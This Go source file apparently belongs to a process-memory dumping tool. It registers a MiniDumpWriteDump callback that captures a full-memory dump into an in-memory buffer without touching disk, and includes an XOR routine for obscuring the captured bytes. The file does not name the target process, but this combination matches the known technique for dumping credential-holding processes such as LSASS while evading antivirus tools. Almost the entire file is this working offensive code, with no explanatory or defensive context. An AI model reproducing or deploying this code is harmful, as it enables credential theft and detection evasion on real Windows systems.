package main

import (
	"golang.org/x/sys/windows"
	"sync"
	"unsafe"
)

const (
	IoStartCallback    = 11
	IoWriteAllCallback = 12
	IoFinishCallback   = 13
)

const (
	MiniDumpWithFullMemory = 0x00000002
)

type MINIDUMP_CALLBACK_INFORMATION struct {
	CallbackRoutine uintptr
	CallbackParam   uintptr
}

type MINIDUMP_IO_CALLBACK struct {
	Handle      uintptr
	Offset      uint64
	Buffer      uintptr
	BufferBytes uint32
}

type MINIDUMP_CALLBACK_INPUT struct {
	ProcessId     uint32
	ProcessHandle uintptr
	CallbackType  uint32
	CallbackInfo  MINIDUMP_IO_CALLBACK
}

type MINIDUMP_CALLBACK_OUTPUT struct {
	Status int32
}

var dumpBuffer []byte
var dumpMutex sync.Mutex

func miniDumpCallback(_ uintptr, CallbackInput uintptr, CallbackOutput uintptr) uintptr {
	newCallbackInput := ptrToMinidumpCallbackInput(CallbackInput)
	newCallbackOutput := ptrToMinidumpCallbackOutput(CallbackOutput)
	switch newCallbackInput.CallbackType {
	case IoStartCallback:
		newCallbackOutput.Status = int32(windows.S_FALSE)
		setNewCallbackOutput(newCallbackOutput, CallbackOutput)
		break
	case IoWriteAllCallback:
		ioCallback := newCallbackInput.CallbackInfo
		copyDumpBytes(ioCallback)
		newCallbackOutput.Status = int32(windows.S_OK)
		setNewCallbackOutput(newCallbackOutput, CallbackOutput)
		break
	case IoFinishCallback:
		newCallbackOutput.Status = int32(windows.S_OK)
		setNewCallbackOutput(newCallbackOutput, CallbackOutput)
		break
	default:
		return 1
	}
	return 1
}

func ptrToMinidumpCallbackInput(ptrCallbackInput uintptr) MINIDUMP_CALLBACK_INPUT {
	var input MINIDUMP_CALLBACK_INPUT
	input.ProcessId = *(*uint32)(unsafe.Pointer(ptrCallbackInput))
	input.ProcessHandle = *(*uintptr)(unsafe.Pointer(ptrCallbackInput + unsafe.Sizeof(uint32(0))))
	input.CallbackType = *(*uint32)(unsafe.Pointer(ptrCallbackInput + unsafe.Sizeof(uint32(0)) + unsafe.Sizeof(uintptr(0))))
	input.CallbackInfo = *(*MINIDUMP_IO_CALLBACK)(unsafe.Pointer(ptrCallbackInput + unsafe.Sizeof(uint32(0)) + unsafe.Sizeof(uintptr(0)) + unsafe.Sizeof(uint32(0))))
	return input
}

func ptrToMinidumpCallbackOutput(ptrCallbackOutput uintptr) MINIDUMP_CALLBACK_OUTPUT {
	var output MINIDUMP_CALLBACK_OUTPUT
	output.Status = *(*int32)(unsafe.Pointer(ptrCallbackOutput))
	return output
}

func copyDumpBytes(callback MINIDUMP_IO_CALLBACK) {
	dumpMutex.Lock()
	defer dumpMutex.Unlock()

	requiredSize := int(callback.Offset) + int(callback.BufferBytes)
	if requiredSize > len(dumpBuffer) {
		padding := make([]byte, requiredSize)
		dumpBuffer = append(dumpBuffer, padding...)
	}

	bufferSlice := make([]byte, callback.BufferBytes)
	for i := 0; i < int(callback.BufferBytes); i++ {
		bufferSlice[i] = *((*byte)(unsafe.Pointer(callback.Buffer + uintptr(i))))
	}

	copy(dumpBuffer[callback.Offset:], bufferSlice)
}

func setNewCallbackOutput(newCallbackOutput MINIDUMP_CALLBACK_OUTPUT, ptr uintptr) {
	size := unsafe.Sizeof(newCallbackOutput)
	memPtr := uintptr(unsafe.Pointer(&newCallbackOutput))
	for i := uintptr(0); i < size; i++ {
		targetByte := (*byte)(unsafe.Pointer(ptr + i))
		sourceByte := (*byte)(unsafe.Pointer(memPtr + i))
		*targetByte = *sourceByte
	}
}

func xor(input *[]byte, key []byte) {
	for i := 0; i < len(*input); i++ {
		(*input)[i] = (*input)[i] ^ key[i%len(key)]
	}
}
